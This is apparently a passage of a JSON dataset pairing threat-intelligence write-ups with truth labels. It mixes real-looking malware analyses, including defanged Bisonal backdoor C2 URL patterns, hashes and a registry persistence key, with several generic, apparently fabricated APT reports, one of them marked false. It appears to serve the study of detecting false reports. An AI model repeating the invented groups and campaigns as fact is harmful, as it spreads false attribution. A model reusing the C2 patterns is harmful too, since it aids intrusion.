        "explain": "Symantec’s Targeted Attack Analytics uncovers new attack campaigns in South East Asia. Since Symantec first exposed the Thrip group in 2018, the stealthy China-based espionage group has continued to mount attacks in South East Asia, hitting military organizations, satellite communications operators, and a diverse range of other targets in the region. Many of its recent attacks have involved a previously unseen backdoor known as Hannotog (Backdoor.Hannotog) and another backdoor known as Sagerunex (Backdoor.Sagerunex). Analysis of the latter has revealed close links to another long-established espionage group called Billbug (aka Lotus Blossom). In all likelihood, Thrip and Billbug now appear to be one and the same.Thrip APT group hits targets in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, Vietnam https://symc.ly/2m4FiUv,Since we last published on Thrip in June 2018, the group has attacked at least 12 organizations, all located within South East Asia. Its targets have been located in Hong Kong, Macau, Indonesia, Malaysia, the Philippines, and Vietnam. The group has attacked a diverse range of targets over the past year, most notably military targets in two different countries. It has also attacked organizations in the maritime communications, media, and education sectors. Thrip has continued to target organizations in the satellite communications sector, with evidence of activity dating to as recently as July 2019.One of the most alarming discoveries we made in our original Thrip research was that the group had targeted a satellite communications operator and seemed to be interested in the operational side of the company, looking for and infecting computers running software that monitored and controlled satellites. Significantly, Thrip has continued to target organizations in the satellite communications sector, with evidence of activity dating to as recently as July 2019.Much of this recent activity was uncovered by Symantec following the discovery of a Thrip tool, a backdoor called Hannotog which appears to have been used since at least January 2017. It was first detected in an organization in Malaysia, where it triggered an alert for suspicious WMI activity with our Targeted Attack Analytics (TAA) technology, available in Symantec Endpoint Detection and Response (EDR).TAA leverages artificial intelligence in order to comb through Symantec’s vast data and spot patterns associated with targeted attacks. It is capable of automatically flagging incidents that would otherwise have taken thousands of hours of analyst time to identify. TAA allowed us to uncover Hannotog and from there, our expert threat hunting team built out a profile of the adversary’s tools, tactics, and procedures. This allowed us to identify other organizations that have been compromised by Thrip, allowing us to build up a complete picture of the group’s most recent activities. Hannotog is a custom backdoor which provides the attackers with a persistent presence on the victim’s network. It has been used in conjunction with several other Thrip tools, including Sagerunex, another custom backdoor providing remote access to the attackers, and Catchamas (Infostealer.Catchamas), a custom Trojan deployed on selected computers of interest and designed to steal information. In addition to custom malware, Thrip has made extensive use of dual-use tools and living-off-the-land tactics. These include: Credential dumping Archiving tools PowerShell Proxy tools,Since Symantec first uncovered Thrip in 2018, we’ve found strong evidence linking it to the Billbug group. What ties the two groups together is the Sagerunex backdoor. This malware appears to be an evolution of an older Billbug tool known as Evora. By comparing strings and code flow between the two, we found that: The code for logging in both is the same The logging string format is similar, Evora is just more verbose The log name for both starts with “\\00EV” The command and control (C&C) communication code flows are similar Billbug is a long-established espionage group, active since at least January 2009. Similar to the Thrip sub-group, the wider Billbug group is known for specializing in operations against targets in South Asia. Billbug’s targets are usually compromised by either spear-phishing emails or watering hole attacks. The group’s spear-phishing attacks have tended to use exploits in Microsoft Office and PDF documents to drop its malware onto victims’ computers. To date, many of the group’s targets have been governments or military organizations.Thrip appears to have been undeterred by its exposure last year, continuing to mount espionage attacks against a wide range of targets in South East Asia. Its link to the Billbug group puts its activities into context and proves its attacks are part of a broader range of espionage activity heavily focused on (but not limited to) governments, armed forces, and communications providers. Symantec’s TAA was the catalyst for both our initial discovery of Thrip in 2018 and the discovery of new tools and victims in 2019. Without TAA’s artificial intelligence, it is quite likely that the group’s activities may have gone undetected for a lot longer.\n\n\n",

Remember how the SolarWinds attack put Microsoft, Cisco, FireEye, Mimecast, and 18,000 other companies at risk? In light of the military conflict, nation-state threat actors from around the world, including from countries that are not directly involved in the crisis, are actively carrying out cyber espionage operations. In the summer of 2022, the Group-IB Managed Extended Detection and Response (MXDR) solution successfully detected and blocked an email carrying a malicious attachment. This email was intended for Group-IB’s employees. While analyzing this attack, Anastasia Tikhonova, Head of APT Research, and Dmitry Kupin, Senior Malware Analyst, at the Group-IB Threat Intelligence team found patterns in the actions of the attackers and attributed the observed TTPs to Tonto Team.

The tool allows the threat actor to create malicious RTF exploits with plausible decoy content for CVE-2017-11882, CVE-2018-0802, and CVE-2018-0798, which are the vulnerabilities in the Microsoft Equation Editor. Researchers at Malwarebytes and SentinelOne have previously highlighted some of the indicators of compromise connected to RTF documents, but we would like to take a closer look into the kill chain. The decoy document has the following metadata: Running the decoy, we found an encoded malicious payload dcnx18pwh.wmf (MD5:518439fc23cb0b4d21c7fd39484376ff): Analysis of the decrypted payload The decrypted payload was a malicious EXE file in PE32 format (MD5:e40c514739768ba04ab17ff0126c1533) that can be classified as a Bisonal.DoubleT backdoor. This malware provides remote access to an infected computer and allows an attacker to execute various commands on it. We conducted a static analysis of the Bisonal.DoubleT sample to compare it with an old version detected in 2020 (MD5:c3d25232add0238d04864fc992e7a330) and found similar strings: In addition, we conducted a dynamic comparison analysis of the sample obtained in 2022 with other samples in the Bisonal.DoubleT malware family: MD5 e40c514739768ba04ab17ff0126c1533 (sample 2022) c3d25232add0238d04864fc992e7a330 (sample 2020) URL hXXp://137.220.176[.]165/ru/order/index.php?strPageID=234989760 hXXp://www.offices-update[.]com/ru/order/index.php?strPageID=234989760 User-Agent Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: JSESSIONID=AHAKQAIOMIBQAAA3HEKQAAIAAAAAMAAAAAAQAAAAAEFA ASSFKJJE6TCEFVIEGBQAJVUWO5LFNQFAASSFKJJE6TCEFVIEGAAAAIADEMQ= Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36 The identical patterns of network requests are highlighted in red, and the generated ID is in blue.

Connection to the C2 of the Bisonal sample from the IZ:SOC public report As you can see from the table and the screenshot above, the network requests are very similar. The main functionality of Bisonal.DoubleT: collecting information about the compromised host: system language encoding, proxy server address, time since system boot, hostname, account name under which the file is running, and local IP address; getting a list of processes; stopping a specified process; getting remote access to cmd.exe; downloading a file from the control server and running it; creating a file on a disk using the local language encoding. The collected information about the compromised host is encoded using the Base32 algorithm. All of the important strings are encoded using the following RC4 algorithm in a non-standard implementation with a 128-byte S-box: After decryption, the strings look like this: The data transmitted in a POST request (sending the result of the command execution) is encrypted using the same RC4 algorithm in a non-standard implementation with a 128-byte S-box to encrypt strings in the malware’s body. Basic communication patterns between the threat actor’s C2 and Bisonal.DoubleT: Request Template Example Hello – GET request hXXps://137[.]220[.]176[.]165/ru/order/index.php?strPageID=[ID], where ID is a decimal number hXXps://137[.]220[.]176[.]165/ru/order/index.php?strPageID=167880896 Command – GET request hXXps://137[.]220[.]176[.]165/ru/news/index.php?strPageID=[ID]&newsID=[YYYY-MM-DD-mmss] hXXps://137[.]220[.]176[.]165/ru/news/index.php?strPageID=167880896&newsID=2022-06-21-1023 Response – POST request hXXps://137[.]220[.]176[.]165/xhome[.]native[.]page/datareader.php?sid=[ID] hXXps://137[.]220[.]176[.]165/xhome[.]native[.]page/datareader.php?sid=167880896 Download & Execute – GET request hXXps://137[.]220[.]176[.]165/siteFiles/index.php?strPageID=[ID] hXXps://137[.]220[.]176[.]165/siteFiles/index.php?strPageID=167880896 Attribution The set of files described above can be considered related to the cyberespionage group Tonto Team. The Bisonal.DoubleT malware was previously attributed to this threat actor and has been used by the group since at least 2019. Analysis of the network infrastructure showed the usage of the IP address (137[.]220[.]176[.]165), which had previously been seen in the Tonto Team attacks. The document was also created in the Royal Road RTF Weaponizer. Thus, there are several connections between the attempted attack against Group-IB and the Tonto Team APT: Metadata in the decoy documents indicates that the operating system language of the document’s author was Simplified Chinese. Documents are created in Royal Road, the well-known malicious document builder widely used by Chinese APT groups. Malicious documents are commonly used to deliver custom malware. Bisonal and its DoubleT version are both existing for over 10 years with continuous development and are attributed to the Tonto Team. It was not the first time the Tonto Team has shown interest in the IT sector. In March 2021, the group hacked into the email servers of a purchasing company and a software development and cybersecurity consulting company based in Eastern Europe. Therefore, Group-IB specialists assess with high confidence that this activity was carried out by the Tonto Team. We’ve seen them before During the research, we wondered if it was not the first attempt of the Tonto Team to attack Group-IB. To answer this question, we have studied the entire Group-IB Managed XDR database of neutralized malicious mailings and discovered that in the summer of 2021 the threat actor tried to attack Group-IB employees. The attempt was unsuccessful. The screenshot below shows that on June 28, 2021, the Group-IB Managed XDR blocked an email sent to our employees. This email contained a file that we identified as malicious: The Group-IB malware detonation platform analyzed the malicious attachment, so we were able to see the following picture: Is it really the same scheme? In 2021, the threat actor used spearphishing as the initial attack vector and once again employed fake mail registered with the GMX Mail service. The analyzed file “30 июня B 17.30 – очередное заседание Исполкома АДЭ.doc” (MD5:7c138c6b6f88643d7c16e741f98e0503) is a malicious RTF document that was created in the Royal Road RTF Weaponizer, similar to the email attachment used in the 2022 attack on Group-IB. The decoy has the following metadata: Malicious encoded payload (8.t MD5: d5d0a1a034dcefdb08d9ca51c7694a22): Analysis of the decrypted payload The decrypted payload is a malicious PE32 format DLL file that can be classified as Bisonal.Dropper. This malware is used to deploy the Bisonal backdoor on the victim’s system. Compiled Date: 06/28/2021 01:44:01 UTC (which is 9:44 Beijing time – the beginning of a workday in China) Bisonal.Dropper creates a file “%AppData%\\Roaming\\conhost.exe” (Bisonal.DoubleT backdoor). It records random overlay data to “conhost.exe” to change the backdoor hash. The dropper also adds “conhost.exe” to the system startup by creating a registry key setting: [HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] userInit = “%AppData%\\Roaming\\conhost.exe” The backdoor will run only after a system reboot. Bisonal.DoubleT may write the following error messages to the log file “%windows%\\temp\\log.txt“: “[!] get pRegSetValueEx error\n” “[!] get pGetProcAddress error\n” “[!] get LoadLibraryA error\n” “conhost.exe” (MD5: f53965ab81f746f5a2bf183d2a704c72) is a malicious EXE file in PE32 format that can be classified as a Bisonal.DoubleT backdoor. Comparing this sample from 2021 with the sample from 2022, we haven’t found any difference in functionality and encryption algorithms. In the 2021 sample, all important strings are also encoded using the RC4 algorithm in a non-standard implementation with a 128-byte S-box: After decryption, the strings look like this: In addition, we compared the decrypted strings of the 2022 and 2021 samples. The different strings of the 2022 sample are marked in red, and the strings of the 2021 sample are highlighted in yellow. Below is the result of comparing the strings of the indicated Bisonal.DoubleT samples: Basic communication patterns between C2 and Bisonal.DoubleT: Request Template Example Hello – GET request hXXps://103[.]85[.]20[.]194/ru/order/index.php?strPageID=[ID], where ID is a decimal number hXXps://103[.]85[.]20[.]194/ru/order/index.php?strPageID=167880896 Command – GET request hXXps://103[.]85[.]20[.]194/ru/news/index.php?strPageID=[ID]&newsID=[YYYY-MM-DD-mmss] hXXps://103[.]85[.]20[.]194/ru/news/index.php?strPageID=167880896&newsID=2022-06-22-1422 Response – POST request hXXps://103[.]85[.]20[.]194/xhome[.]native[.]page/datareader.php?sid=[ID] hXXps://103[.]85[.]20[.]194/xhome[.]native[.]page/datareader.php?sid=167880896 Download & Execute – GET request hXXps://103[.]85[.]20[.]194/siteFiles/index.php?strPageID=[ID] hXXps://103[.]85[.]20[.]194/siteFiles/index.php?strPageID=167880896 So, there’s nothing new at all? In the 2022 attack, Tonto Team used a new downloader that Group-IB named TontoTeam.Downloader. It has also been called QuickMute in another public source. As usual, the group used a malicious RTF document that was created in Royal Road — Вниманию.doc (MD5: 8cdd56b2b4e1e901f7e728a984221d10).The decrypted payload is a malicious EXE file in PE32 format (MD5: 66c46b76bb1a1e7ecdb091619a8f5089), which can be classified as a downloader. This file is used to download malware for the next stage of the attack, which is a DLL with the specified export function “HttpsVictimMain”. The configuration data of the analyzed file is encrypted using RC4. The key is contained in the malware body and is 256 bytes long.Group-IB experts have previously warned about threats from TaskMasters and TA428, other Chinese nation-state cyber threat actors. Based on the conducted analysis, the company’s Threat Intelligence team concluded that Tonto Team is behind the 2021-2022 attempted attacks on Group-IB. The main goal of Chinese APTs are espionage and intellectual property theft. Undoubtedly, Tonto Team will keep probing IT and cybersecurity companies by leveraging spear phishing to deliver malicious documents using vulnerabilities with decoys specially prepared for this purpose. Successful supply chain attacks against IT and cybersecurity companies give attackers access to a large number of victims’ customers and partners. Therefore, organizations in these sectors need to stay up to date with ever-evolving tools, tactics, and methods of threat actors and employ Group-IB Managed XDR for advanced threat detection and response. This solution proved its efficiency in preventing the alleged Tonto Team attack on the Group-IB’s employees. Group-IB Managed XDR contains a whole range of advanced cybersecurity solutions to stop complex targeted attacks,Group-IB will continue to research the methods, tools and tactics of Tonto Team and inform the organizations targeted by this pro-state group. We aspire to promptly inform the attacked organizations about the discovered malicious activity against them – it helps minimize the damage from threat actor’s actions. Additionally, we consider informing the cybersecurity community about the discovered threats as a part of our mission and encourage other researchers to study complex threats together, share data and use our technologies to combat intruders.\n\n\n",

        "explain": "Cybersecurity researchers have uncovered an espionage campaign that has targeted a national data center of an unnamed central Asian country in order to conduct watering hole attacks. The campaign is believed to be active covertly since fall 2017 but was spotted in March by security researchers from Kaspersky Labs, who have attributed these attacks to a Chinese-speaking threat actor group called LuckyMouse. LuckyMouse, also known as Iron Tiger, EmissaryPanda, APT 27 and Threat Group-3390, is the same group of Chinese hackers who was found targeting Asian countries with Bitcoin mining malware early this year.The group has been active since at least 2010 and was behind many previous attack campaigns resulting in the theft of massive amounts of data from the directors and managers of US-based defense contractors. This time the group chose a national data center as its target from an unnamed country in Central Asia in an attempt to gain “access to a wide range of government resources at one fell swoop.” According to the researchers, the group injected malicious JavaScript code into the official government websites associated with the data center in order to conduct watering hole attacks.Although LuckyMouse has been spotted using a widely used Microsoft Office vulnerability (CVE-2017-11882) to weaponize Office documents in the past, researchers have no proofs of this technique being used in this particular attack against the data center. The initial attack vector used in the attack against the data center is unclear, but researchers believe LuckyMouse possibly had conducted watering hole or phishing attacks to compromise accounts belonging to employees at the national data center.The attack against the data center eventually infected the targeted system with a piece of malware called HyperBro, a Remote Access Trojan (RAT) deployed to maintain persistence in the targeted system and for remote administration.“There were traces of HyperBro in the infected data center from mid-November 2017. Shortly after that different users in the country started being redirected to the malicious domain update.iaacstudio[.]com as a result of the waterholing of government websites,” the researchers said in a blog post published today. “These events suggest that the data center infected with HyperBro and the waterholing campaign are connected.” As a result of the waterholing attack, the compromised government websites redirected the country's visitors to either penetration testing suite Browser Exploitation Framework (BeEF) that focuses on the web browser, or the ScanBox reconnaissance framework, which perform the same tasks as a keylogger. The main command and control (C&C) server used in this attack is hosted on an IP address which belongs to a Ukrainian ISP, specifically to a MikroTik router running a firmware version released in March 2016. Researchers believe the Mikrotik router was explicitly hacked for the campaign in order to process the HyperBro malware's HTTP requests without detection.\n\n\n",

        "explain": "While much of the cybersecurity world focuses on the notorious APT28, another equally formidable but more elusive group operates in the shadows: APT29, also known as Cozy Bear. Unlike its counterpart, Cozy Bear's operations are shrouded in mystery, with its activities largely unknown to the public. However, recent investigations have shed light on this group's extensive cyber espionage campaigns targeting Western governments and industries. APT29 is believed to have Russian origins, similar to APT28, and operates with a level of sophistication and discretion that surpasses many other groups. It has been active since at least 2010, focusing on long-term infiltration of high-value targets to gather intelligence rather than immediate financial gain or public disruption. One of the most significant campaigns attributed to APT29 is the infiltration of a major NATO member's defense ministry, where they maintained undetected access for over two years. This operation involved the use of custom malware and highly sophisticated techniques to avoid detection, including the exploitation of encrypted channels for communication and data exfiltration. Unlike APT28, which often uses brute-force attacks and spear-phishing, APT29 favors the 'slow and steady' approach, quietly embedding itself within an organization's network to monitor and gather information over extended periods. The group has also been implicated in attacks against the healthcare sector, particularly targeting research institutions involved in COVID-19 vaccine development. These attacks aimed to steal sensitive research data, highlighting the group's interest in acquiring valuable intellectual property. Despite the growing awareness of APT29's activities, the group remains a significant threat due to its ability to adapt and evolve its tactics. Organizations are urged to enhance their cybersecurity measures, including the implementation of advanced threat detection systems and regular security audits, to protect against such sophisticated adversaries.",

        "explain": "On July 14, 2023, cybersecurity firm SentinelOne detected a sophisticated cyber espionage campaign aimed at stealing proprietary research data from leading pharmaceutical companies in the United States and Japan. The attackers, tracked as CyberVanguard, employed a novel malware strain dubbed 'PharmaSpy' to infiltrate the networks of these organizations. The campaign involved meticulously crafted spear-phishing emails that impersonated regulatory bodies, such as the FDA in the U.S. and the PMDA in Japan, to lure victims into downloading attachments infected with PharmaSpy. Once inside the network, PharmaSpy facilitated the exfiltration of sensitive data related to COVID-19 vaccine research and development. SentinelOne's analysis revealed that PharmaSpy utilizes a complex encryption algorithm to evade detection and communicates with C&C servers through a series of proxy networks, making it challenging to trace the attackers' actual location. CyberVanguard's tactics, techniques, and procedures (TTPs) indicate a high level of sophistication and suggest that the group has significant resources at its disposal, likely backed by a nation-state or a well-funded private entity. The targeting of healthcare and pharmaceutical sectors during a global pandemic underscores the potential geopolitical motivations behind CyberVanguard's operations.

        "label": "false",
        "explain": "Cybersecurity firm CyberGuard has uncovered a new cyber threat group, named ShadowByte, which has been conducting targeted attacks against global retail chains since late 2022. ShadowByte's primary method of operation involves the deployment of advanced point-of-sale (POS) malware, designed to steal credit card information from unsuspecting customers. The group initiates its attacks through spear-phishing emails targeted at retail employees, containing malicious attachments disguised as inventory lists or employee schedules. Once an employee opens the attachment, the malware is deployed within the retailer's network, seeking out POS systems to infect. ShadowByte's malware, dubbed 'CheckoutChaser', is capable of skimming credit card data during transactions and transmitting the stolen information to servers controlled by the threat actors. The sophistication of CheckoutChaser lies in its ability to evade detection by most antivirus software, using a combination of encryption and polymorphic code to remain undetected. CyberGuard's analysis indicates that ShadowByte has successfully compromised dozens of retail chains across North America, Europe, and Asia, resulting in the theft of millions of credit card details. The group's precise targeting and advanced technical capabilities suggest the possibility of state sponsorship or affiliation with a larger cybercrime syndicate. Efforts to trace ShadowByte's operations have been hampered by their use of sophisticated obfuscation techniques and a network of proxy servers to hide their tracks.",

        "explain": "VECTOR's intrusion activity includes phishing campaigns that deploy banking Trojans to steal financial data and credentials. The group has been operational since early 2019, showing a significant increase in activity in late 2019 to early 2020. This timeline and the focus on financial institutions coincide with a global rise in online financial transactions due to increasing digitalization. VECTOR’s targeting of cryptocurrency exchanges suggests an interest in blockchain technology and digital currencies, aligning with global financial trends. Like HEXANE, VECTOR employs tactics such as exploiting third-party services and supply chains of their targets. For instance, CyberIntelHub identified instances where VECTOR compromised financial software providers to inject malicious code into legitimate financial platforms. By attacking these third-party vendors, VECTOR can potentially infiltrate financial institutions' networks through trusted relationships, circumventing traditional security measures. VECTOR shows operational similarities to cybercriminal groups like COBALT and FIN7, focusing on the financial sector but distinguishes itself through its unique malware toolkit and geographical focus. Unlike HEXANE, VECTOR's observed victimology is primarily centered on financial entities, combining both traditional banking systems and emerging financial technologies. Additionally, VECTOR's infrastructure, including the use of command and control servers hosted on compromised educational institution networks and novel obfuscation techniques, sets it apart from other financial-focused cybercriminal groups. CyberIntelHub categorizes cyber threat groups based on observed behaviors, tactics, techniques, and procedures (TTPs), and VECTOR's distinct operational profile necessitates targeted defensive strategies. Currently, CyberIntelHub assesses with moderate confidence that VECTOR is seeking financial gain through data exfiltration and cryptocurrency theft.",
